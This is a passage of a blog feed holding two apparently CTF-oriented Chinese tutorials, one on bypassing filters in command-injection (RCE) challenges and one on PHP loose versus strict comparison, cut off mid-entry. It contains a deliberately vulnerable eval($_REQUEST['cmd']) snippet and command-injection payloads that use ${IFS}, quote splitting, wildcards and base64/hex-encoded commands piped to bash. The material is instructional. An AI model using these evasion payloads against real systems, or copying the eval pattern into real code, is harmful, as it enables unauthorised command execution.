    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE中一些常见的绕过方法</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>入门级理解，没啥含金量:)</p><span id="more"></span><p><strong>命令执行漏洞前提条件：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.存在可调用执行系统命令的函数。<br>2.该函数参数可控。<br>3.对参数过滤不严格。<br></code></pre></td></tr></table></figure><p><strong>一些常见可以执行命令的函数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-number">1</span>.<span class="hljs-keyword">eval</span>()<span class="hljs-comment">//把一串字符串作为PHP代码执行</span><br><span class="hljs-number">2</span>.<span class="hljs-title function_ invoke__">system</span>()/<span class="hljs-title function_ invoke__">passthru</span>()/<span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-number">3</span>.<span class="hljs-title function_ invoke__">call_user_func</span>()/<span class="hljs-title function_ invoke__">call_user_func_array</span>() <span class="hljs-comment">//回调函数</span><br><span class="hljs-number">4</span>.<span class="hljs-title function_ invoke__">creat_function</span>()<br><span class="hljs-number">5</span>.shell_exec <span class="hljs-comment">//注意这玩意儿没回显，不过可以通过把它传给某个文件或者echo的方法看执行结果，比如：</span><br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls -l&#x27;</span>); <span class="hljs-comment">// 执行ls -l命令并将输出保存到$output变量中</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>     /?cmd=ls -al / &gt; viper3.txt<br><span class="hljs-number">6</span>.还可以用反引号``和$()执行命令。<br><span class="hljs-number">7</span>.preg_match的/e模式漏洞。<br></code></pre></td></tr></table></figure><p>最后那个&#x2F;e模式好像已经被弃用好久了。。举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(\d+)/e&#x27;</span>;<br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;&quot;$1&quot; + 1&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// 输出124</span><br></code></pre></td></tr></table></figure><p><code>/(\d+)/e</code>模式匹配一个或多个数字，并使用<code>&quot;$1&quot; + 1</code>作为替换字符串。在替换过程中，<code>&quot;$1&quot;</code>被解析为匹配的数字，然后加1。因此，最终的替换结果是123 + 1，即124。</p><p><strong>管道符(Windows)：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|直接执行后面的语句</span><br><span class="hljs-string">||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="hljs-meta">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="hljs-meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></code></pre></td></tr></table></figure><p><img src="/img/b2.png" alt="b2"></p><p><img src="/img/b3.png" alt="b3"></p><p><strong>管道符(Linux)：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|直接执行后面的语句</span><br><span class="hljs-string">||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="hljs-meta">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="hljs-meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br>;       前后命令都要执行，无论前面真假<br></code></pre></td></tr></table></figure><p><strong>空格绕过(ls &#x2F;和cat等均需空格)：</strong></p><p>1.${IFS}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$&#123;IFS&#125;/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>2.$IFS$9</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$IFS$9/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>3.%09</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:<code>/?cmd=system(&#39;ls%09/&#39;);</code></p><p><img src="/img/b4.png" alt="b4"></p><p>4.&lt;和&lt;&gt;重定向符号</p><p>在Linux中，<code>&lt;</code>是用于重定向输入的符号，它将一个文件的内容作为命令的输入。<code>&lt;</code>符号后面跟着文件名，表示将该文件的内容作为命令的输入。</p><p>例如，假设有一个名为input.txt的文件，包含了一些文本内容。可以使用<code>&lt;</code>符号将input.txt文件的内容作为命令的输入，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &lt; input.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将input.txt文件的内容作为command命令的输入。</p><p>另外，<code>&gt;</code>符号用于重定向输出，它将命令的输出保存到一个文件中。如果文件不存在，则会创建该文件；如果文件已存在，则会覆盖原有内容。</p><p>而<code>&gt;&gt;</code>符号则用于追加输出，它将命令的输出追加到一个文件的末尾，而不是覆盖原有内容。</p><p>例如，假设有一个名为output.txt的文件，可以使用<code>&gt;</code>符号将命令的输出保存到output.txt文件中，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">command &gt; output.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将其输出保存到output.txt文件中。</p><p>而使用<code>&gt;&gt;</code>符号可以将命令的输出追加到output.txt文件的末尾，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &gt;&gt; output.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将其输出追加到output.txt文件的末尾。</p><p>总结起来，<code>&lt;</code>用于重定向输入，<code>&gt;</code>用于重定向输出，<code>&gt;&gt;</code>用于追加输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat&lt;hello.txt<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ cat&lt;&gt;hello.txt<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>注意这东西没法和ls配合使用。</p><p>5.利用{}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ &#123;cat,hello.txt&#125;<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ &#123;ls,/&#125;<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>大括号（{}）在这个命令中被用作命令行扩展。它会将大括号中的内容展开为多个参数，然后将这些参数传递给命令进行处理。</p><p>6.SQL语句中可以利用&#x2F;**&#x2F;和()包裹字符串代替空格(这个就不算RCE里的绕过了，哈哈)</p><p><strong>过滤关键字，比如cat,tac,ls之类的</strong></p><p>替代：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br></code></pre></td></tr></table></figure><p>利用某些转义符号：</p><p><code>&#39;&#39;,&quot;&quot;,\,$&#123;Z&#125;,$*,$@,$任意，$&#123;任意&#125;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ l&#x27;&#x27;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l&quot;&quot;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$&#123;Z&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l/s<br>bash: l/s: 没有那个文件或目录<br>[viper3@localhost ~]$ l\s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$*s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$@s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$9s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$&#123;k&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br></code></pre></td></tr></table></figure><p>拼接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ a=hel;b=lo.txt;cat $a$b<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>使用反引号&#96;&#96;或$()绕过(比如和printf配合使用)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ printf &quot;\154\163&quot;<br>ls<br>[viper3@localhost ~]$ `printf &quot;\154\163&quot;`<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ (printf &quot;\154\163&quot;)<br>ls[viper3@localhost ~]$ $(printf &quot;\154\163&quot;)<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br></code></pre></td></tr></table></figure><p>printf “??????”这东西是输出???代表的ASCII码值，???代表八进制(也可以用\x??十六进制)，$()这个符号是把括号里面的东西当命令执行,反引号同理。</p><p>通配符</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">在Linux中，通配符是用来匹配文件名或路径的特殊字符。它们可以用于命令行中的文件搜索、文件操作和正则表达式等场景中。<br><br>以下是常用的通配符：<br><br>    *：匹配任意字符（包括空字符）的任意数量。<br>    ?：匹配单个任意字符。<br>    <span class="hljs-selector-attr">[]</span>：匹配方括号内的任意一个字符。<br>    <span class="hljs-selector-attr">[!]</span> 或 <span class="hljs-selector-attr">[^]</span>：匹配不在方括号内的任意一个字符。<br>    &#123;&#125;：用于指定多个选择项，以逗号分隔。<br>    ~：表示当前用户的主目录。<br><br>举例来说，如果你想匹配所有以 <span class="hljs-selector-class">.txt</span> 结尾的文件，可以使用通配符 *<span class="hljs-selector-class">.txt</span>；如果你想匹配以 <span class="hljs-selector-tag">a</span> 开头的三个字符的文件，可以使用通配符 <span class="hljs-selector-tag">a</span>??。<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat he*<br>hello world!<br>yes<br>no<br>why<br>tom<br>jerry<br>chris<br>jack<br>[viper3@localhost ~]$ cat ?????.txt<br>hello world!<br>yes<br>no<br>why<br>*匹配任意数量，这东西可以和find查找命令结合起来:<br>find / -name &quot;fl*&quot;   /是根目录，搜索根目录下所有名字带fl的文件(fl开头，后面任意)<br>注意：这里的?和*都只能用于文件名，如果是命令(类似ls cat等)就不适用。<br>但是：<br>m0re师傅的文章里在开头加了个/???就可以把/?用于命令了：<br><br>zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?at flag<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?at ????<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br></code></pre></td></tr></table></figure><p><strong>编码绕过(应该把前面那个printf的放在这里的，可惜)：</strong></p><p>base64:(这东西可以和前面的&#96;&#96;和$()配合使用)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d<br>cat hello.txt<br>[viper3@localhost ~]$ `echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d`<br>hello world!<br>yes<br>no<br>why<br><br>Y2F0IGhlbGxvLnR4dA== 是cat hello.txt的base64<br></code></pre></td></tr></table></figure><p>hex:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag<br><br>同上，仍能用``及$()替换最后管道符及bash<br></code></pre></td></tr></table></figure><p>换行绕过(感觉这个没怎么用过)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ca\<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">t \</span><br><span class="language-bash">&gt; hello\</span><br><span class="language-bash">&gt; .txt</span><br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>\表示换行，下一行是这行的延续。</p><p>m0re师傅的文章中还有这么个东西：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ca\\&quot;</span>&gt;shell   两个\是为了转义后面的\，以便将其作为普通字符写入文件。</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;t\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; fl\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ag&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> shell</span><br>ca\<br>t\<br> fl\<br>ag<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh shell</span>  <br>you are good!<br><br>sh shell是运行名为&quot;shell&quot;的脚本文件的意思。在Linux中，使用sh命令后跟脚本文件的名称可以运行该脚本。<br></code></pre></td></tr></table></figure><p><strong>利用$PATH环境变量绕过：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo $PATH<br>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/viper3/.local/bin:/home/viper3/bin<br>[viper3@localhost ~]$ echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;<br>ls<br>[viper3@localhost ~]$ `echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ `$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>&quot;hello.txt&quot;:1: bad minute<br>errors in crontab file, can&#x27;t install.<br><br>注意不要少了echo!<br></code></pre></td></tr></table></figure><p>以上内容参考了这些师傅们的文章，感谢：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_53142368/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">116152477</span><br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">391439312</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_45836474/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">107248010</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net/qq_51295677?type=blog<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP中的弱相等和强相等</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<p>入门级理解，没啥含金量:)</p><span id="more"></span><hr><p>本人的一点拙见。</p><p>先看下GPT对弱相等和强相等的解释：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">在PHP中，弱相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span>）和强相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>）是用于比较两个值的操作符，它们有以下区别：<br><br>    <span class="hljs-number">1</span>.弱相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span>）：弱相等用于比较两个值是否相等，不考虑值的数据类型。如果两个值在转换后相等，则返回true，否则返回false。弱相等会自动进行类型转换，例如将字符串转换为数字进行比较。<br><br>    <span class="hljs-number">2</span>.强相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>）：强相等用于比较两个值是否相等，且要求两个值的数据类型也相同。除了比较值是否相等外，还要求比较的两个值的数据类型也相同。如果值和数据类型都相等，则返回true，否则返回false。强相等不会进行自动类型转换<br></code></pre></td></tr></table></figure><p>在弱相等比较中，<code>不考虑数据类型</code>，<code>转换后</code>相等返回<code>true</code>,否则返回<code>false</code>。所以整型、浮点型、字符串、布尔型等均可比较，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//字符串和整型或浮点型比较，字符串若以数字开头则从开头截取到字母出现的位置：</span><br><span class="hljs-string">&#x27;111&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111abc&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111admin&#x27;</span> == <span class="hljs-number">111.000000</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;notbad3333&#x27;</span> == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br><span class="hljs-comment">//布尔型与字符串和整型及浮点型均可相互比较：</span><br>True == <span class="hljs-string">&#x27;hello world!&#x27;</span><span class="hljs-comment">//True</span><br>True == <span class="hljs-string">&#x27;123abc&#x27;</span> <span class="hljs-comment">//True,字符串里面只要不是单个0，任何组合(哪怕是0.0)都与True弱相等</span><br>True ==<span class="hljs-string">&#x27;0.0000&#x27;</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0.0</span> <span class="hljs-comment">//True,0.0000等同理</span><br>False == <span class="hljs-literal">null</span> <span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">//True</span><br>False ==<br><span class="hljs-comment">//科学计数法的相关比较,并拓展到MD5加密比较</span><br><span class="hljs-number">0e333</span> == <span class="hljs-string">&#x27;0e111&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;0e321&#x27;</span>==<span class="hljs-string">&#x27;0e789&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-comment">//比如两个东西加密后均以0e开头，那他们就是弱相等的</span><br><span class="hljs-comment">//拓展到is_numeric的绕过，很经典的是让你输入一个东西(GET或POST传，这个东西不能是数字却要大于或小于或等于某个特定的数字)</span><br> <span class="hljs-comment">//注意虽然`0==null==false`成立，但不能因为`&#x27;notbad3333&#x27; == 0`就推出`&#x27;notbad3333&#x27; == null/false`!</span><br></code></pre></td></tr></table></figure><p>在强相等中，不光要求值相等类型还要相等。如果想要绕过两个md5的强相等：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//数组法</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;oh you find me!&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//可用GET传?a[]=a&amp;b[]=b，MD5没法给数组加密会返回null(报错)，但这时两个null满足了强相等。</span><br><span class="hljs-comment">//碰撞法:MD5被认为是不安全的，利用现有的MD5的强碰撞解题</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 